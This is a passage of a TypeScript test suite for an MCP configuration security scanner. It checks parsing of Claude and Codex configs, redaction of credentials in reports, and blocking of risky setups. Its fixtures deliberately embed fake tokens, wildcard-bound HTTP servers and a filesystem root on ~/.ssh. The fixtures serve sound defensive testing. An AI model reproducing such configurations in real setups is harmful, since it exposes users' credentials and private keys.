          userRemote: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem'] }
        },
        projects: {
          [cwd]: {
            disabledMcpServers: ['projectDisabled'],
            mcpServers: {
              projectShell: { command: 'bash', args: ['-lc', 'echo project'] },
              projectDisabled: { command: 'bash', args: ['-lc', 'echo disabled'] }
            }
          }
        }
      })
    )

    const report = scanMcp({ cwd, home, now: '2026-07-03T15:00:00.000Z' })
    const byName = new Map(report.targets.map((target) => [target.serverName, target]))
    const disabled = byName.get('projectDisabled')
    const findingTargets = new Set(report.findings.flatMap((finding) => finding.affectedTargets.map((target) => target.targetId)))

    expect([...byName.keys()].sort()).toEqual(['projectDisabled', 'projectShell', 'userRemote'])
    expect(byName.get('userRemote')).toMatchObject({ client: 'Claude', scope: 'user', enabled: true })
    expect(byName.get('projectShell')).toMatchObject({ client: 'Claude', scope: 'project', enabled: true })
    expect(disabled).toMatchObject({ client: 'Claude', scope: 'project', enabled: false, introspection: { status: 'not_run', reason: 'target_disabled' } })
    expect(new Set(report.targets.map((target) => target.targetId)).size).toBe(3)
    expect(report.skipped).toContainEqual({ targetId: disabled?.targetId, reason: 'target_disabled' })
    expect(findingTargets).toContain(byName.get('userRemote')?.targetId)
    expect(findingTargets).toContain(byName.get('projectShell')?.targetId)
    expect(findingTargets).not.toContain(disabled?.targetId)
    expect(report.summary.status).toBe('block')
  })

  it('Codex .codex/config.toml 按 mcp_servers 表解析并保留项目 scope', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-codex-'))
    const codexDir = join(dir, '.codex')
    mkdirSync(codexDir)
    const config = join(codexDir, 'config.toml')
    writeFileSync(
      config,
      `
[mcp_servers.github]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-github", "--github-token", "fixture-github-token"]
env = { GITHUB_TOKEN = "fixture-env-token" }

[mcp_servers."open-http"]
url = "http://0.0.0.0:3456/mcp?token=fixture-url-secret"
transport = "http"
`
    )

    const report = scanMcp({ configPaths: [config] })
    const github = report.targets.find((target) => target.serverName === 'github')
    const openHttp = report.targets.find((target) => target.serverName === 'open-http')

    expect(github).toMatchObject({ client: 'Codex', scope: 'project', command: 'npx', envKeys: ['GITHUB_TOKEN'] })
    expect(github?.args).toEqual(['-y', '@modelcontextprotocol/server-github', '--github-token', '[REDACTED]'])
    expect(openHttp).toMatchObject({ transport: 'streamable_http', url: 'http://0.0.0.0:3456/mcp?token=REDACTED' })
    expect([...new Set(report.findings.map((finding) => finding.rule.id))]).toEqual(expect.arrayContaining(['MCP-CMD-002', 'MCP-ENV-001', 'MCP-HTTP-001']))
    expect(JSON.stringify(report)).not.toContain('fixture-github-token')
    expect(JSON.stringify(report)).not.toContain('fixture-env-token')
    expect(JSON.stringify(report)).not.toContain('fixture-url-secret')
  })

  it('Codex .codex/config.toml 的多行数组会解析 args 和 roots', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-codex-multiline-'))
    const codexDir = join(dir, '.codex')
    mkdirSync(codexDir)
    const config = join(codexDir, 'config.toml')
    writeFileSync(
      config,
      `
[mcp_servers.fs]
command = "npx"
args = [
  "-y",
  "@modelcontextprotocol/server-filesystem",
  "/Users/example",
]
roots = [
  "/Users/example",
]
tools = [
  { name = "read_file", description = "Read approved files." },
]
`
    )

    const report = scanMcp({ configPaths: [config] })
    const target = report.targets.find((item) => item.serverName === 'fs')
    const findings = report.findings.filter((item) => item.rule.id === 'MCP-FS-001')
    const pointers = findings.map((finding) => finding.evidence[0]?.sourceSpan?.jsonPointer).sort()

    expect(report.summary.status).toBe('block')
    expect(target).toMatchObject({ client: 'Codex', scope: 'project', command: 'npx' })
    expect(target?.args).toEqual(['-y', '@modelcontextprotocol/server-filesystem', '/Users/example'])
    expect(target?.roots).toContain('/Users/example')
    expect(target?.toolFingerprints[0]).toMatchObject({ name: 'read_file' })
    expect(pointers).toEqual(['/mcp_servers/fs/args/2', '/mcp_servers/fs/roots/0'])
  })

  it('自定义 queue 路径不误判为 Amazon Q，明确 amazonq 路径仍识别', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-client-inference-'))
    const queueDir = join(dir, 'queue')
    const amazonqDir = join(dir, 'home', '.aws', 'amazonq')
    mkdirSync(queueDir)
    mkdirSync(amazonqDir, { recursive: true })
    const queueConfig = join(queueDir, 'config.json')
    const amazonqConfig = join(amazonqDir, 'mcp.json')
    writeFileSync(queueConfig, JSON.stringify({ mcpServers: { queueServer: { command: '/usr/local/bin/local-mcp' } } }))
    writeFileSync(amazonqConfig, JSON.stringify({ mcpServers: { amazonqServer: { command: '/usr/local/bin/local-mcp' } } }))

    const report = scanMcp({ configPaths: [queueConfig, amazonqConfig] })
    const byName = new Map(report.targets.map((target) => [target.serverName, target]))

    expect(byName.get('queueServer')).toMatchObject({ client: 'custom', sourcePath: queueConfig })
    expect(byName.get('amazonqServer')).toMatchObject({ client: 'Amazon Q', sourcePath: amazonqConfig })
  })

  it('provider-specific token 参数值会在 inventory 和输出中脱敏', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-provider-secrets-'))
    const config = join(dir, 'config.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          github: { command: '/usr/local/bin/github-mcp', args: ['--github-token', 'fixture-github-token'] },
          openai: { command: '/usr/local/bin/openai-mcp', args: ['--openai-api-key=fixture-openai-api-key'] },
          anthropic: { command: '/usr/local/bin/anthropic-mcp', args: ['--anthropic-api-key', 'fixture-anthropic-api-key'] }
        }
      })
    )

    const report = scanMcp({ configPaths: [config] })

    expect(report.targets.find((t) => t.serverName === 'github')?.args).toEqual(['--github-token', '[REDACTED]'])
    expect(report.targets.find((t) => t.serverName === 'openai')?.args).toEqual(['--openai-api-key=[REDACTED]'])
    expect(report.targets.find((t) => t.serverName === 'anthropic')?.args).toEqual(['--anthropic-api-key', '[REDACTED]'])
    expect(JSON.stringify(report)).not.toContain('fixture-github-token')
    expect(JSON.stringify(report)).not.toContain('fixture-openai-api-key')
    expect(JSON.stringify(report)).not.toContain('fixture-anthropic-api-key')
  })

  it('command 字段中的凭证不会进入 JSON、SARIF 或 evidence bundle', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-command-secrets-'))
    const config = join(dir, 'config.json')
    const jsonOut = join(dir, 'report.json')
    const evidenceOut = join(dir, 'evidence.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          urlCommand: {
            command: 'https://fixture-command-user:fixture-command-token@example.com/mcp?api_key=fixture-command-api-key'
          },
          assignmentCommand: {
            command: 'token=fixture-command-inline-secret'
          }
        }
      })
    )

    const json = runCli(['scan', '--config', config], { cwd: dir })
    runCli(['scan', '--config', config, '--out', jsonOut, '--evidence-bundle', evidenceOut], { cwd: dir })
    const sarif = runCli(['scan', '--config', config, '--format', 'sarif'], { cwd: dir })
    const byName = new Map(json.report.targets.map((target) => [target.serverName, target]))
    const serialized = [
      json.text,
      JSON.stringify(json.report),
      readFileSync(jsonOut, 'utf8'),
      readFileSync(evidenceOut, 'utf8'),
      sarif.text
    ].join('\n')

    expect(byName.get('urlCommand')?.command).not.toContain('fixture-command-token')
    expect(byName.get('urlCommand')?.command).not.toContain('fixture-command-api-key')
    expect(byName.get('assignmentCommand')?.command).toBe('token=[REDACTED]')
    expect(serialized).not.toContain('fixture-command-user')
    expect(serialized).not.toContain('fixture-command-token')
    expect(serialized).not.toContain('fixture-command-api-key')
    expect(serialized).not.toContain('fixture-command-inline-secret')
  })

  it('凭证型 args/header/command/url/package 进入 high finding 并触发 fail-on', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-secret-findings-'))
    const config = join(dir, 'config.json')
    const tool = { name: 'ping', description: 'Ping the local server.' }
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          github: { command: '/usr/local/bin/github-mcp', args: ['--github-token', 'fixture-github-token'], tools: [tool] },
          openai: { command: '/usr/local/bin/openai-mcp', args: ['--openai-api-key=fixture-openai-api-key'], tools: [tool] },
          headerNext: { command: '/usr/local/bin/header-mcp', args: ['--header', 'Authorization: Bearer fixture-header-token'], tools: [tool] },
          urlCommand: {
            command: 'https://fixture-command-user:fixture-command-token@example.com/mcp?api_key=fixture-command-api-key',
            tools: [tool]
          },
          assignmentCommand: { command: 'token=fixture-command-inline-secret', tools: [tool] },
          openHttp: { url: 'http://localhost:3456/mcp?token=fixture-url-secret', tools: [tool] },
          packageOnly: {
            command: '/usr/local/bin/package-mcp',
            package: 'git+https://fixture-package-user:fixture-package-token@example.com/org/private-mcp.git?token=fixture-package-query-token',
            tools: [tool]
          },
          privateGit: {
            command: '/usr/local/bin/private-mcp',
            repository: 'https://fixture-repo-user:fixture-repo-token@example.com/org/private-mcp.git?api_key=fixture-repo-api-key',
            tools: [tool]
          }
        }
      })
    )

    const result = runCli(['scan', '--config', config, '--fail-on', 'high'], { cwd: dir })
    const findings = result.report.findings.filter((finding) => finding.rule.id === 'MCP-SECRET-001')
    const pointers = findings.map((finding) => finding.evidence[0]?.sourceSpan?.jsonPointer).sort()
    const serialized = `${result.text}\n${JSON.stringify(result.report)}`

    expect(result.exitCode).toBe(2)
    expect(result.report.summary.status).toBe('block')
    expect(findings).toHaveLength(8)
    expect(findings.every((finding) => finding.severity === 'high' && finding.policy.decision === 'block')).toBe(true)
    expect(pointers).toEqual([
      '/mcpServers/assignmentCommand/command',
      '/mcpServers/github/args/1',
      '/mcpServers/headerNext/args/1',
      '/mcpServers/openHttp/url',
      '/mcpServers/openai/args/0',
      '/mcpServers/packageOnly/package',
      '/mcpServers/privateGit/repository',
      '/mcpServers/urlCommand/command'
    ])
    expect(serialized).not.toContain('fixture-command-token')
    expect(serialized).not.toContain('fixture-command-api-key')
    expect(serialized).not.toContain('fixture-command-inline-secret')
    expect(serialized).not.toContain('fixture-package-token')
    expect(serialized).not.toContain('fixture-package-query-token')
    expect(serialized).not.toContain('fixture-github-token')
    expect(serialized).not.toContain('fixture-openai-api-key')
    expect(serialized).not.toContain('fixture-header-token')
    expect(serialized).not.toContain('fixture-url-secret')
    expect(serialized).not.toContain('fixture-repo-token')
    expect(serialized).not.toContain('fixture-repo-api-key')
  })

  it('env key 不敏感但 value 是 token literal 时产生 secret finding，且报告不泄露 value', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-env-literal-secret-'))
    const config = join(dir, 'config.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          literalEnv: {
            command: '/usr/local/bin/local-mcp',
            env: {
              SAFE_NAME: 'sk-testsecret123456',
              NORMAL_VALUE: 'plain-value'
            },
            tools: [{ name: 'ping', description: 'Ping the local server.' }]
          }
        }
      })
    )

    const report = scanMcp({ configPaths: [config] })
    const secretFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-SECRET-001')
    const envKeyFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-ENV-001')
    const serialized = JSON.stringify(report)

    expect(secretFindings).toHaveLength(1)
    expect(secretFindings[0]).toMatchObject({ title: 'Sensitive credential value is embedded in MCP server env: SAFE_NAME', severity: 'high' })
    expect(secretFindings[0]?.evidence[0]?.sourceSpan?.jsonPointer).toBe('/mcpServers/literalEnv/env/SAFE_NAME')
    expect(secretFindings[0]?.evidence[0]?.keyName).toBe('SAFE_NAME')
    expect(envKeyFindings).toHaveLength(0)
    expect(serialized).not.toContain('sk-testsecret123456')
  })

  it('secret-like serverName 和 JSON pointer segment 不进入 JSON/SARIF/evidence bundle', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-server-name-secret-'))
    const config = join(dir, 'config.json')
    const jsonOut = join(dir, 'report.json')
    const evidenceOut = join(dir, 'evidence.json')
    const rawServerName = 'sk-reviewsecret123456'
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          [rawServerName]: {
            command: 'bash',
            args: ['-lc', 'echo boot'],
            tools: [{ name: 'ping', description: 'Ping the local server.' }]
          }
        }
      })
    )

    const json = runCli(['scan', '--config', config, '--out', jsonOut, '--evidence-bundle', evidenceOut], { cwd: dir })
    const sarif = runCli(['scan', '--config', config, '--format', 'sarif'], { cwd: dir })
    const serialized = [JSON.stringify(json.report), readFileSync(jsonOut, 'utf8'), readFileSync(evidenceOut, 'utf8'), sarif.text, JSON.stringify(renderSarif(json.report))].join('\n')
    const target = json.report.targets[0]

    expect(target?.serverName).toBe('[REDACTED]')
    expect(target?.sourceSpan?.jsonPointer).toBe('/mcpServers/[REDACTED]')
    expect(json.report.findings[0]?.evidence[0]?.sourceSpan?.jsonPointer).toBe('/mcpServers/[REDACTED]/command')
    expect(serialized).not.toContain(rawServerName)
  })

  it('认证机制 args 不会被误判为 secret finding 或 fail-on 阻断', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-auth-mode-'))
    const config = join(dir, 'config.json')
    const tool = { name: 'ping', description: 'Ping the local server.' }
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          oauth: {
            command: '/usr/local/bin/oauth-mcp',
            args: ['--auth-type', 'oauth', '--auth-method=pkce', '--auth-mode', 'browser'],
            tools: [tool]
          }
        }
      })
    )

    const result = runCli(['scan', '--config', config, '--fail-on', 'high'], { cwd: dir })

    expect(result.exitCode).toBe(0)
    expect(result.report.summary.status).toBe('pass')
    expect(result.report.findings.filter((finding) => finding.rule.id === 'MCP-SECRET-001')).toHaveLength(0)
    expect(result.report.targets.find((target) => target.serverName === 'oauth')?.args).toEqual([
      '--auth-type',
      'oauth',
      '--auth-method=pkce',
      '--auth-mode',
      'browser'
    ])
  })

  it('generic header bearer 参数会在 inventory 和输出中脱敏', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-header-secrets-'))
    const config = join(dir, 'config.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          headerNext: { command: '/usr/local/bin/header-mcp', args: ['--header', 'Authorization: Bearer fixture-header-token'] },
          headerInline: { command: '/usr/local/bin/header-mcp', args: ['-H=Proxy-Authorization: Basic fixture-basic-token'] },
          standalone: { command: '/usr/local/bin/header-mcp', args: ['Authorization: Bearer fixture-standalone-token'] }
        }
      })
    )

    const result = runCli(['scan', '--config', config], { cwd: dir })
    const byName = new Map(result.report.targets.map((target) => [target.serverName, target]))
    const serialized = `${result.text}\n${JSON.stringify(result.report)}\n${JSON.stringify(renderSarif(result.report))}`

    expect(byName.get('headerNext')?.args).toEqual(['--header', 'Authorization: Bearer [REDACTED]'])
    expect(byName.get('headerInline')?.args).toEqual(['-H=Proxy-Authorization: Basic [REDACTED]'])
    expect(byName.get('standalone')?.args).toEqual(['Authorization: Bearer [REDACTED]'])
    expect(serialized).not.toContain('fixture-header-token')
    expect(serialized).not.toContain('fixture-basic-token')
    expect(serialized).not.toContain('fixture-standalone-token')
  })

  it('package 和 repository URL 凭证会在 inventory 和输出中脱敏', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-package-secrets-'))
    const config = join(dir, 'config.json')
    const packageSpec = 'git+https://fixture-package-user:fixture-package-token@example.com/org/private-mcp.git'
    const repository = 'https://fixture-repo-user:fixture-repo-token@example.com/org/private-mcp.git?api_key=fixture-repo-api-key'
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          privateGit: { command: 'npx', args: ['-y', packageSpec], repository }
        }
      })
    )

    const report = scanMcp({ configPaths: [config] })
    const target = report.targets.find((t) => t.serverName === 'privateGit')
    const serialized = JSON.stringify(report)

    expect(target?.args.join(' ')).not.toContain('fixture-package-token')
    expect(target?.package).not.toContain('fixture-package-token')
    expect(target?.repository).not.toContain('fixture-repo-token')
    expect(serialized).not.toContain('fixture-package-user')
    expect(serialized).not.toContain('fixture-package-token')
    expect(serialized).not.toContain('fixture-repo-user')
    expect(serialized).not.toContain('fixture-repo-token')
    expect(serialized).not.toContain('fixture-repo-api-key')
  })

  it('CLI --package 的 sourcePath/serverName/SARIF locations 不泄露 package spec 凭证', () => {
    const spec = 'git+https://fixture-cli-user:fixture-cli-token@example.com/org/private-mcp.git?token=fixture-cli-query-token'

    const json = runCli(['scan', '--package', spec])
    const target = json.report.targets[0]
    const sarif = runCli(['scan', '--package', spec, '--format', 'sarif'])
    const serialized = JSON.stringify({ report: json.report, text: json.text, sarif: sarif.text })

    expect(target).toMatchObject({ client: 'package', sourceType: 'package' })
    expect(target?.sourcePath ?? '').not.toContain('fixture-cli-token')
    expect(target?.serverName ?? '').not.toContain('fixture-cli-token')
    expect(target?.package ?? '').not.toContain('fixture-cli-token')
    expect(target?.args.join(' ') ?? '').not.toContain('fixture-cli-token')
    expect(serialized).not.toContain('fixture-cli-user')
    expect(serialized).not.toContain('fixture-cli-token')
    expect(serialized).not.toContain('fixture-cli-query-token')
  })

  it('拿不到 tool definition 时输出 not_observed / not_introspected 语义，不当作 pass 证据', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-not-observed-'))
    const config = join(dir, 'config.json')
    writeFileSync(config, JSON.stringify({ mcpServers: { unknown: { command: '/usr/local/bin/unknown-mcp' } } }))

    const report = scanMcp({ configPaths: [config] })

    expect(report.summary.status).toBe('warn')
    expect(report.targets[0]?.introspection).toEqual({ status: 'not_observed', reason: 'no_static_manifest_or_baseline' })
    expect(report.skipped).toContainEqual(expect.objectContaining({ targetId: report.targets[0]?.targetId, reason: 'dynamic_introspection_disabled' }))
  })

  it('IPv6 wildcard HTTP 和敏感 home root 会触发高危 finding', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-http-root-expanded-'))
    const home = join(dir, 'home')
    const cwd = join(dir, 'workspace')
    mkdirSync(home, { recursive: true })
    mkdirSync(cwd, { recursive: true })
    const config = join(cwd, '.mcp.json')
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          ipv6Http: { url: 'http://[::]:3456/mcp', transport: 'http' },
          starHttp: { url: 'http://*:3456/mcp', transport: 'http' },
          mappedHttp: { url: 'http://[::ffff:0.0.0.0]:3456/mcp', transport: 'http' },
          mappedShortHttp: { url: 'http://[::ffff:0:0]:3456/mcp', transport: 'http' },
          plusHttp: { url: 'http://+:3456/mcp', transport: 'http' },
          sshRoot: { command: '/usr/local/bin/local-mcp', roots: ['~/.ssh'] }
        }
      })
    )

    const report = scanMcp({ cwd, home })
    const httpFindings = report.findings.filter((finding) => finding.rule.id === 'MCP-HTTP-001')
    const fsFinding = report.findings.find((finding) => finding.rule.id === 'MCP-FS-001')

    expect(httpFindings).toHaveLength(5)
    expect(httpFindings.every((finding) => finding.title === 'HTTP MCP server is bound to a wildcard interface' && finding.severity === 'high')).toBe(true)
    expect(fsFinding).toMatchObject({ title: 'MCP server has broad filesystem root: ~/.ssh', severity: 'high' })
  })

  it('SARIF 输出包含 rules/results/partialFingerprints，供 CI 或 code scanning 消费', () => {
    const report = scanMcp({ configPaths: [fixture('risky-config.json')], baselinePath: fixture('baseline.json') })
    const sarif = renderSarif(report) as {
      version: string
      runs: Array<{ tool: { driver: { rules: unknown[] } }; results: Array<{ partialFingerprints: Record<string, string>; fingerprints?: unknown }> }>
    }

    expect(sarif.version).toBe('2.1.0')
    expect(sarif.runs[0].tool.driver.rules.length).toBeGreaterThan(0)
    expect(sarif.runs[0].results.length).toBe(report.findings.length)
    expect(sarif.runs[0].results[0].partialFingerprints.mcpguard).toMatch(/^sha256:/)
    expect(sarif.runs[0].results[0].partialFingerprints.dedupeKey).toContain(':')
    expect(sarif.runs[0].results[0].fingerprints).toBeUndefined()
  })

  it('CLI --fail-on high 返回非 0，并可写 JSON/SARIF/evidence bundle 文件', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-'))
    const jsonOut = join(dir, 'report.json')
    const evidenceOut = join(dir, 'evidence.json')
    const sarifOut = join(dir, 'report.sarif')

    const failed = runCli([
      'scan',
      '--config',
      fixture('risky-config.json'),
      '--baseline',
      fixture('baseline.json'),
      '--format',
      'json',
      '--out',
      jsonOut,
      '--evidence-bundle',
      evidenceOut,
      '--fail-on',
      'high'
    ])
    expect(failed.exitCode).toBe(2)
    expect(JSON.parse(readFileSync(jsonOut, 'utf8'))).toMatchObject({ summary: { status: 'block' } })
    expect(JSON.parse(readFileSync(evidenceOut, 'utf8'))).toMatchObject({ audit: { generatedFor: 'local-only' } })

    const sarif = runCli(['scan', '--config', fixture('safe-config.json'), '--format', 'sarif', '--out', sarifOut, '--fail-on', 'high'])
    expect(sarif.exitCode).toBe(0)
    expect(JSON.parse(readFileSync(sarifOut, 'utf8'))).toMatchObject({ version: '2.1.0' })
  })

  it('CLI gate 配置错误时 fail closed，不把缺失输入或非法阈值当作通过', () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcpguard-gate-'))
    const out = join(dir, 'bad-report.json')
    const eqOut = join(dir, 'eq-report.json')
    const accidentalTrue = join(dir, 'true')

    const eqResult = runCli([`scan`, `--config=${fixture('safe-config.json')}`, '--format=json', `--out=${eqOut}`, '--fail-on=high'], { cwd: dir })
    expect(eqResult.exitCode).toBe(0)
    expect(JSON.parse(readFileSync(eqOut, 'utf8'))).toMatchObject({ summary: { status: 'pass' } })
    expect(() => runCli(['scan', '--config', join(dir, 'missing.json')])).toThrow(/config file not found/)
    expect(() => runCli(['scan', '--config', fixture('risky-config.json'), '--out', out, '--fail-on', 'bogus'])).toThrow(/invalid --fail-on severity/)
    expect(() => runCli(['scan', '--config', fixture('risky-config.json'), '--failon', 'high'])).toThrow(/unknown option: --failon/)
    expect(() => runCli(['scan', '-c', fixture('risky-config.json'), '--fail-on', 'high'])).toThrow(/unknown option: -c/)
    expect(() => runCli(['scan', fixture('risky-config.json'), '--fail-on', 'high'])).toThrow(/unexpected argument for scan/)
    expect(() => runCli(['inventory', fixture('safe-config.json')])).toThrow(/unexpected argument for inventory/)
    expect(() => runCli(['baseline', 'write', fixture('safe-config.json'), fixture('risky-config.json'), '--out', out])).toThrow(/unexpected argument for baseline write/)
    expect(() => runCli(['baseline', 'write', fixture('safe-config.json'), '--report', fixture('risky-config.json'), '--out', out])).toThrow(/unexpected argument for baseline write/)
    expect(() => runCli(['scan', '--config', fixture('safe-config.json'), '--unknown=true'], { cwd: dir })).toThrow(/unknown option: --unknown/)
    expect(() => runCli(['scan', '--config', fixture('safe-config.json'), '--out', '--fail-on', 'high'], { cwd: dir })).toThrow(/missing value for --out/)
    expect(() => runCli(['scan', '--config', fixture('safe-config.json'), '--out='], { cwd: dir })).toThrow(/missing value for --out/)
    expect(() => runCli(['scan', '--config', '--fail-on', 'high'], { cwd: dir })).toThrow(/missing value for --config/)
    expect(() => runCli(['scan', '--config', fixture('safe-config.json'), '--baseline', '--fail-on', 'high'], { cwd: dir })).toThrow(/missing value for --baseline/)
    expect(() => runCli(['scan', '--package'], { cwd: dir })).toThrow(/missing value for --package/)
    expect(() => runCli(['scan', '--config-dir'], { cwd: dir })).toThrow(/missing value for --config-dir/)
    expect(() => runCli(['scan', '--server-dir'], { cwd: dir })).toThrow(/missing value for --server-dir/)
    expect(() => runCli(['scan', '--config', fixture('safe-config.json'), '--format='], { cwd: dir })).toThrow(/missing value for --format/)
    expect(() => runCli(['scan', '--config', fixture('safe-config.json'), '--evidence-bundle'], { cwd: dir })).toThrow(/missing value for --evidence-bundle/)
    expect(() => runCli(['baseline', 'write', '--report'], { cwd: dir })).toThrow(/missing value for --report/)
    expect(existsSync(out)).toBe(false)
    expect(existsSync(accidentalTrue)).toBe(false)
  })
})
